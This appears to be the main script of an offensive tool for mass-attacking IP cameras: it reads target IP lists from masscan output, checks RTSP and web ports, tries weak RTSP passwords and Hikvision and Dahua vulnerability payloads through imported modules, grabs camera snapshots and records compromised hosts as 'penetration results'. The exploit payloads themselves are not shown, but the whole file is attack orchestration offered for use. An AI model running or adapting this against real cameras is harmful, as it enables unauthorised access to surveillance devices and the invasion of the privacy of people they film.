# encoding=utf-8
from typing import Union
from pathlib import Path
import json
from threading import Lock
from concurrent.futures import ThreadPoolExecutor
from utils.runshell import run_cmd
from utils.log import logger
from utils.rtsp_easy_pwd import get_rtsp as easypwd_get_rtsp
from utils.check_port_open import Check_Port
from hikvision.payload import get_rtsp as hk_get_rtsp
from hikvision.payload import get_cve as hk_get_cve
from dahua.payload import get_rtsp as dh_get_rtsp
from dahua.payload import get_cve as dh_get_cve

basepath = Path(__file__).parent.absolute()
res_file = Path(basepath, "res.txt")

photo = Path(basepath, "photo")
photo.mkdir(exist_ok=True)

easy_rtsp = Path(photo, "easy_rtsp")
easy_rtsp.mkdir(exist_ok=True)

hk_rtsp = Path(photo, "hk_rtsp")
hk_rtsp.mkdir(exist_ok=True)

dh_rtsp = Path(photo, "dh_rtsp")
dh_rtsp.mkdir(exist_ok=True)

hk_cve = Path(photo, "hk_cve")
hk_cve.mkdir(exist_ok=True)

lock = Lock()


def handle_macsan_json(path: Union[Path, str]) -> None:
    """处理 macsan 的 json 数据"""
    with Path(path).open(mode="r", encoding="utf8") as fp:
        j_obj = json.loads(s=fp.read())
    with Path(basepath, "sst.txt").open(mode="a", encoding="utf8") as r:
        for j in j_obj:
            ip = j["ip"]
            r.write(ip+"\n")


def load_ips(path: Path = Path(basepath, "sst.txt")) -> list:
    """加载摄像头ip列表"""
    with path.open(mode="r", encoding="utf8") as fp:
        ctx = fp.read().split("\n")
    ctx.sort(key=lambda x: ''.join(
        [i.rjust(3, '0') for i in x.split('.')]), reverse=False)
    return ctx


def save_res(msg):
    """保存渗透结果"""
    with lock:
        with res_file.open(mode="a", encoding="utf8") as fp:
            logger.success(msg)
            fp.write(msg+"\n")


def rtsp(ip: str) -> bool:
    # 1. 检查554 rtsp端口是否开放
    if not Check_Port(ip, 554):
        logger.error(f"IP:{ip} rtsp端口未开放！")
        return False

    # 2. 开始 RTSP 弱密码！！
    easy_res = easypwd_get_rtsp(ip, easy_rtsp)

    if easy_res:
        save_res(f"[+] {ip}存在{easy_res[1]}")
    elif hk_get_rtsp(ip, hk_rtsp):
        save_res(f"[+] {ip}存在海康威视弱密码!")
    elif dh_get_rtsp(ip, dh_rtsp):
        save_res(f"[+] {ip}存在大华弱密码!")
    else:
        return False

    return True


def web(ip: str) -> bool:
    # 13 检查80 web端口是否开放
    if not Check_Port(ip, 80):
        logger.error(f"IP:{ip} web80端口未开放！")
        return False

    # 4. 开始尝试 cve 漏洞！
    if hk_get_cve(ip, hk_cve):
        save_res(f"[+] {ip}存在海康威视漏洞!")
    elif dh_get_cve(ip):
        save_res(f"[+] {ip}存在大华web漏洞!")
    else:
        return False

    return True


def payload(ip: str):
    """针对单个摄像头的攻击"""
    r = rtsp(ip)
    w = web(ip)

    if not (r or w):
        logger.error(f"[-] {ip}无漏洞...")

    return


def main():
    for ip in load_ips():
        payload(ip)


if __name__ == "__main__":
    # handle_macsan_json(Path(basepath, "allsst.json"))
    # payload("10.1.6.100")  # 正常获取
    # payload("10.1.9.235")  # 异常
    main()
    # run_cmd("ping baidu.com")
    pass
